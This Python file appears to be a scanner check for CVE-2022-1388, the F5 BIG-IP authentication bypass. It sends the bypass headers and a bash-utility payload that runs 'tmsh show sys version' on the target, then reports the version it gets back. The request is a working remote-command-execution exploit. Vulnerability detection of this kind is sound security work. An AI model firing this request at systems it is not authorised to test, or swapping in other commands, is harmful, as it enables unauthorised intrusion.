import requests
import json
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2022_1388(ip, ports=None, timeout=5):
    """
    Check for CVE-2022-1388 - Authentication bypass vulnerability in F5 BIG-IP
    This vulnerability allows unauthenticated attackers to execute arbitrary commands via the management interface
    """
    if ports is None:
        ports = [443, 8443]  # Default BIG-IP management ports
    else:
        ports = [int(port) for port in ports]
    
    headers = {
        "User-Agent": user_agents(),
        "Connection": "keep-alive, X-F5-Auth-Token",
        "Authorization": "Basic YWRtaW46",  # Base64 of "admin:"
        "X-F5-Auth-Token": "dummy",
        "Content-Type": "application/json"
    }
    
    payload = {
        "command": "run",
        "utilCmdArgs": "-c 'tmsh show sys version'"
    }
    
    vulnerable = False
    
    for port in ports:
        url = f"https://{ip}:{port}/mgmt/tm/util/bash"
        
        try:
            response = requests.post(
                url, 
                headers=headers, 
                json=payload, 
                verify=False, 
                timeout=timeout
            )
            
            if response.status_code == 200 and "commandResult" in response.text:
                vulnerable = True
                version_info = json.loads(response.text).get("commandResult", "")
                print_colour(f"[+] The target is vulnerable to CVE-2022-1388 (F5 BIG-IP Auth Bypass): {url}")
                ver = version_info.split("Version ")[1].split("\n")[0] if "Version" in version_info else "Unknown"
                print_colour(f"[+] Software version: {ver}")
                return True
                
        except requests.RequestException:
            continue
    
    return vulnerable 